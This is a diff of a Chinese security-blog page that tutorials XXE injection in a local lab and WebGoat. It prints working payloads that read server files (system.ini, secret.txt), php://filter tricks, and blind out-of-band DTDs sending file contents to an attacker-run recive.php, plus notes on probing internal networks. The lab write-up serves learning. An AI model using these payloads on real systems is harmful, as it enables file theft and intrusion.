@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.5k 字
+      2.4k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      31
+      30
        分钟
     </span>
   
@@ -256,7 +256,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE creds [  <br>&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; <br>&lt;creds&gt;&amp;goodies;&lt;/creds&gt;<br></code></pre></div></td></tr></table></figure>
 
 <p>结果：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405143648.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220405143648.png" srcset="/img/loading.gif" lazyload></p>
 <p>攻击原理与思路：</p>
 <p>1.该处可以提交XML类型数据类型</p>
 <p>2.构造XML，<strong>其中的DTD引用外部实体。</strong><code>&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </code>。SYSTEM外部引用实体会定位到指定地址来引用</p>
@@ -265,13 +265,13 @@
 <h5 id="读取含有特殊字符的文件"><a href="#读取含有特殊字符的文件" class="headerlink" title="读取含有特殊字符的文件"></a>读取含有特殊字符的文件</h5><p>刚才读取的文件中没有任何的特殊符号。如果我们读取的文件中含有特殊符号<code>&lt; &gt;</code>等的话，如PHP文件，就会报错。</p>
 <p>例E:/x.txt文件内容：<code>&lt;hello world</code>，带有特殊符号<code>&lt;</code></p>
 <p>读取结果：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405144253.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220405144253.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li><p>方案一：先编码再读，常用思路</p>
 <p>file:////E:/x.txt换为 php://filter/read=convert.base64-encode/resource=E:/x.txt</p>
 <p><em>利用PHP伪协议filter，这在我文件包含相关内容的博客中有介绍。</em></p>
 <p>结果：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220407231147.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220407231147.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>方案二：利用CDTAT将我们的数据包起来</p>
 <blockquote>
@@ -290,7 +290,7 @@
 <p>2.而这个被调用的dtd只是一个普通的通用实体，但作用是将另外三个参数实体拼接成在了一起</p>
 <p>3.然后XML文档形成时：加载外部dtd文件，准备解析成XML文档–&gt;调用通用实体–&gt;通用实体解析后又调用了三个参数实体–&gt;参数实体解析。拼接完成。</p>
 <p>结果：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405155417.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220405155417.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h4 id="无回显xxe注入"><a href="#无回显xxe注入" class="headerlink" title="无回显xxe注入"></a>无回显xxe注入</h4><h5 id="xxe盲注"><a href="#xxe盲注" class="headerlink" title="xxe盲注"></a>xxe盲注</h5><p>在实际情况中，服务器接收的xml数据是不会输出的，就是说php语句中不会<code>echo $xml;</code>服务器端a.php:</p>
@@ -302,7 +302,7 @@
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/a.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></div></td></tr></table></figure>
 
-<p>xml.dtd:</p>
+<p>a.dtd:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///E:/x.txt&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
 
 <p><strong>注意</strong>，一般情况下只能用file协议指定路径，如</p>
@@ -312,9 +312,8 @@
 <p>参数实体内的%不会生效，所以用&amp;#37代替（&amp;#37的url解码为%）</p>
 <p>在攻击者服务器上，有着一个接收数据的php文件</p>
 <p>recive.php</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>	<span class="hljs-keyword">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
 
-<p><em>我看的大佬们都是用的端口监听，我试下就在windows环境中复现（绝对不是因为我弄不来监听服务😕）</em></p>
 <p>payload作用过程：</p>
 <ul>
 <li><p>payload中定义了参数实体<code>% remote</code>，并调用该实体<code>%remote;</code>，使得xml解析器解析时引用攻击者Web服务器上的dtd文件，接着调用参数实体<code>%int;</code>和<code>%send;</code>。</p>
@@ -332,21 +331,21 @@
 <p>这是因为根据xml文档规定，参数实体不能在DTD子集内调用，但可以在外部子集中调用，即我们payload中的形式。</p>
 <p>实验步骤：</p>
 <p>注意一下要用到的三个文件，靶场a.php，引用的a.dtd，接收数据的recive.php：</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182244.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411182244.png" srcset="/img/loading.gif" lazyload></p>
 <p>上传xml数据，抓包，填上payload，发送</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182446.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411182446.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们再来查看apache的log文件</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182558.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411182558.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功接收到一个经过base64编码的请求，解码验证一下</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182658.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411182658.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功读取到目标主机上的文件</p>
-<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>其实和盲注一样，只是最后发送信息时发送到一个不存在的地方即可，我们还是先再来做一次盲注吧😉后面我会附上上报错注入的效果的</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>其实和盲注一样，只是最后发送信息时发送到一个不存在的地方即可，我们还是先再来做一次盲注吧后面我会附上上报错注入的效果的</p>
 <p>这次我们试着在WebGoat靶场上实现</p>
 <p>以WebGoat A4 xxe部分为例，关卡告诉我们要读取的文件路径为<code>/home/webgoat/.webgoat-8.1.0//XXE/secret.txt</code></p>
 <p>靶场告诉了我们需要读取文件的路径</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411183519.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411183519.png" srcset="/img/loading.gif" lazyload></p>
 <p>在这个评论区处我们上传评论并抓包</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220409201013.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220409201013.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现数据以xml格式提交，先在攻击机上准备好被引用的dtd文件</p>
 <p>a.dtd：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;<br>&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.189.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
@@ -355,14 +354,14 @@
 <p>设置payload并发送：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.189.1/a.dtd&quot;&gt;<br>%dtd;<br>%print;<br>%send;<br>]&gt;<br>&lt;comment&gt;  &lt;text&gt;aaa&lt;/text&gt;&lt;/comment&gt;<br></code></pre></div></td></tr></table></figure>
 
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191258.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411191258.png" srcset="/img/loading.gif" lazyload></p>
 <p>同样再查看一下log文件</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191337.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411191337.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功读取到目标数据</p>
 <p>而报错注入的话，会在返回页面的报错信息中获取到文件内容</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411192604.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220411192604.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h4><p>这个比较简单，我就直接复制WebGoat靶场的图了</p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220412213503.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220412213503.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="内网相关（留坑）"><a href="#内网相关（留坑）" class="headerlink" title="内网相关（留坑）"></a>内网相关（留坑）</h4><p>从盲注的步骤中可以注意到，我们可以使服务器主动发起连接请求。那么我们也可以使服务器访问内网主机，这也是ssrf的形式。</p>
 <blockquote>
 <p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
